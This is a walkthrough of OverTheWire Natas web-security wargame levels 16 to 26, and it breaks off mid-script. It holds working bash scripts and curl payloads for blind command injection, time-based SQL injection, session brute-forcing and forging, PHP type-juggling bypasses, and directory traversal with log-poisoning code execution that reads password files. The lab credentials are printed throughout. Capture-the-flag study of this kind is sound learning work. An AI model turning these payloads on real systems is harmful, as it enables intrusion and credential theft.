LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS="E"
PASS_LEN=31


for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		TMP=$PASS
		TMP+=$char
		OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $TMP /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
		if [ "$OUT" -eq 0 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas17: $PASS"
```

```
abs@MacBookPro OverTheWire % ./brute_force_natas16_2.sh 
Password for natas17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

# Level 16 -> 17:
```
abs@MacBookPro OverTheWire % curl "natas17.natas.labs.overthewire.org/" -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC                                                                       
<h1>natas17</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Exectly the same as natas15, but it doesn't show me the prints...

It had to do something with timing.
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas17.natas.labs.overthewire.org/index.php"
LOGIN="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
	    SECONDS=0
		curl $URL -u $LOGIN -s -F "username=natas18\" AND IF(BINARY SUBSTRING(password,$pos,1)=\"$char\", SLEEP(5), 0) -- \"" > /dev/null
		if [ $SECONDS -ge 5 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas18: $PASS"
```

```
abs@MacBookPro natas % ./brute_force_natas17.sh
Password for natas18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```


# Level 17 -> 18:

```
abs@MacBookPro OverTheWire % curl "natas18.natas.labs.overthewire.org/" -u natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ                                                                       
<h1>natas18</h1>
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

One of the 640 IDs is probably the Admin session ID, so let's bruteforce all of them:
```
#!/bin/bash

IDS=640
URL="natas18.natas.labs.overthewire.org/index.php/index.php?debug=1"
LOGIN="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
PASS=""

for id in $(seq 1 $IDS); do
	curl $URL -u $LOGIN -s -H "Cookie: PHPSESSID=$id" | grep "Password"
done

echo "Password for natas18: $PASS"
```

```
abs@MacBookPro natas % ./brute_force_natas18.sh
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
# Level 18 -> 19:

```
abs@MacBookPro OverTheWire % curl "natas19.natas.labs.overthewire.org/index.php?debug=1" -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr                            
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
<p>
Please login with your admin account to retrieve credentials for natas20.
</p>
<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
```

session IDs are no longer sequential?
```
abs@MacBookPro OverTheWire % curl "natas19.natas.labs.overthewire.org/index.php?debug=1" -u natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr -F "username=admin" -F "password=password" -i | grep Cookie
Set-Cookie: PHPSESSID=3631332d61646d696e; path=/; HttpOnly
```
Sheeeeet

What is this? Let's run it few more times:
```
Set-Cookie: PHPSESSID=3330362d61646d696e; path=/; HttpOnly
Set-Cookie: PHPSESSID=3430312d61646d696e; path=/; HttpOnly
```
Same extesnsion... and also, kind of look like ASCII.

```
abs@MacBookPro OverTheWire % echo "3430312d61646d696e" | xxd -r -p
401-admin%
abs@MacBookPro OverTheWire % echo "3631332d61646d696e" | xxd -r -p
613-admin%   
```

LOL!! Let's do some scripting, based on the prev level:
```
#!/bin/bash

IDS=640
URL="natas19.natas.labs.overthewire.org/index.php/index.php?debug=1"
LOGIN="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
PASS=""

for id in $(seq 1 $IDS); do

	OUT=$(curl $URL -u $LOGIN -s -H "Cookie: PHPSESSID=$(echo -n "$id-admin" | xxd -p)")
	PASS=$(echo $OUT | grep "Password")

	if [ -n "$PASS" ]; then	
		echo "$OUT"
		exit
	fi
done

echo "Password for natas19: $PASS"
```

```
abs@MacBookPro natas % ./brute_force_natas19.sh 
<h1>natas19</h1>
<div id="content">
<p>
<b>

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
```


# Level 19 -> 20:
```
abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD i62ulplu0sknsmud7gkv50it5n<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE i62ulplu0sknsmud7gkv50it5n <br>DEBUG: Saving in /var/lib/php/sessions/mysess_i62ulplu0sknsmud7gkv50it5n<br>% 
```

index-source.html:
```

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```


```
abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw -F "name=admin" -i
Set-Cookie: PHPSESSID=v689v281vt6tlod6vmd0qetnug; path=/; HttpOnly
...
DEBUG: MYREAD v689v281vt6tlod6vmd0qetnug<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
...
DEBUG: MYWRITE v689v281vt6tlod6vmd0qetnug name|s:5:"admin";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_v689v281vt6tlod6vmd0qetnug<br>DEBUG: name => admin<br>%
```


```
abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw  -d $'name=vandelay\nadmin 1' -H "Cookie: PHPSESSID=art"
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD art<br>DEBUG: Reading from /var/lib/php/sessions/mysess_art<br>DEBUG: Read []<br>DEBUG: Name set to vandelay
admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
...
DEBUG: MYWRITE art name|s:16:"vandelay
admin 1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_art<br>DEBUG: name => vandelay
admin 
```

```
abs@MacBookPro OverTheWire % curl "natas20.natas.labs.overthewire.org/index.php?debug=1" -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw  -d $'name=vandelay\nadmin 1' -H "Cookie: PHPSESSID=art"
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD art<br>DEBUG: Reading from /var/lib/php/sessions/mysess_art<br>DEBUG: Read [name vandelay]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to vandelay
admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
```

# Level 20 -> 21:

```
abs@MacBookPro OverTheWire % curl "natas21.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH                                                        
...
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

Let's try bew other site:
```
abs@MacBookPro OverTheWire % curl "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH                                                        
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
)

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

And the new index-source.html:
```
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>
```

So, I want to set the session using the "natas21-experimenter" site, and the re-use it in the regular one...
```
abs@MacBookPro OverTheWire % curl "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -d "name=hiii & submit=yo & admin=1" -i
Set-Cookie: PHPSESSID=8f054i5uko362idrks99b9m9va; path=/; HttpOnly
...
[DEBUG] Session contents:<br>Array
(
    [debug] => 1
    [name] => hiii 
    [submit] => yo 
    [admin] => 1
)
```

```
abs@MacBookPro OverTheWire % curl "natas21.natas.labs.overthewire.org/index.php?debug=1" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -i -H "Cookie: PHPSESSID=8f054i5uko362idrks99b9m9va"
...
You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
```

# Level 21 -> 22:
abs@MacBookPro OverTheWire % curl "http://natas22.natas.labs.overthewire.org//index.php?debug=1" -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -s -i
...
Set-Cookie: PHPSESSID=uplh9o1b02h8ndcibva41ipcsv; path=/; HttpOnly
...
<h1>natas22</h1>
<div id="content">
...
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Very useful..

index-source.html:
```
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

...

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

So if the "revelio" key exists, we will get the password printed, but we'd also redirect.

I'm using curl and won't follow redirects anyway"
```
abs@MacBookPro OverTheWire % curl "http://natas22.natas.labs.overthewire.org//index.php?revelio=1" -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -s -i
HTTP/1.1 302 Found <---- Redirct
...
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
```

# Level 22 -> 23:
```
abs@MacBookPro OverTheWire % curl "http://natas23.natas.labs.overthewire.org//index.php" -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs -s -i
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

So from one hand, passwd should contain the "iloveyou" string, and from the other, the numeric value should be greater than 10:
```
abs@MacBookPro OverTheWire % curl "http://natas23.natas.labs.overthewire.org//index.php" -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs -s -d "passwd=99iloveyou & submit="
...
<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

# Level 23 -> 24:
```
abs@MacBookPro OverTheWire % curl "http://natas24.natas.labs.overthewire.org//index.php" -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd -s
...
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

I can't bruteforce the password that is ~x^32, and I can't guess the password either, so I need to make the strcmp to fail.

If it fails, I get NULL and !NULL will be true.

Everything in the GET request is in a string form, but I can change the type of passwd to be an array:
```
abs@MacBookPro OverTheWire % curl "http://natas24.natas.labs.overthewire.org//index.php?debug=1" -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd -s -d "passwd[]=comeonn & submit=" -i
...
<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```


# Level 24 -> 25:
```
abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s                                     
...
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
```

Let's create a session with easy ID - "art-vandelay", which will also create the logfile `logs/natas25_art-vandelay.log`.

```
abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay"
<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe,
...
```

The language is under "/var/www/natas/natas25/language/" and so does the logs "/var/www/natas/natas25/logs".

So by doing: "../logs/natas25_art-vandelay.log", the from "language" (like in the safeinclude()), I should be able to find the log file.

Because I cant use ../, I'll use the good-old ....//, which will be replaced to ../ in runtime:
```
abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php?lang=....//logs/natas25_art-vandelay.log" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay"
[25.09.2025 12::12:48] curl/8.7.1 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
```

It worked! I can see the logs that happended when it replaced my ....// to ../ !

Now, because I cant read the natas_webpass, I need to dump it's content to my log somehow.

Notice that in the logFile function, it will write the user-agent head, as is, to the logs file. If it was a php code, when it dumps it, it would've been exeuted!

```
abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php?lang=....//logs/natas25_art-vandelay.log" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay" -A '<?php system("cat /etc/natas_webpass/natas26"); ?>'
...
[25.09.2025 12::12:48] curl/8.7.1 "Directory traversal attempt! fixing request."
[25.09.2025 12::13:27] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."
```

# Level 25 -> 26:
```
abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org//index.php" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s -i                                
...
Set-Cookie: PHPSESSID=8fijbetsllcoqc2govb9uhrlkr; path=/; HttpOnly
...
Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<body>
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

We have two cookies:
- The PHPSESSID - used for the img name/path: "img/natas26_$PHPSESSID.png"
- The drawing - encoding of the drawing from the saved session


I'll do object injection of Logger. I'll create Logger, with custom handlers, and create a drawing cookie out of it.

When the php code will end, the destrcut function will be called and write the password of the next level to a new file i'll set:

Let's write a python script that will give us the drawing cookie value:
```
import phpserialize, base64

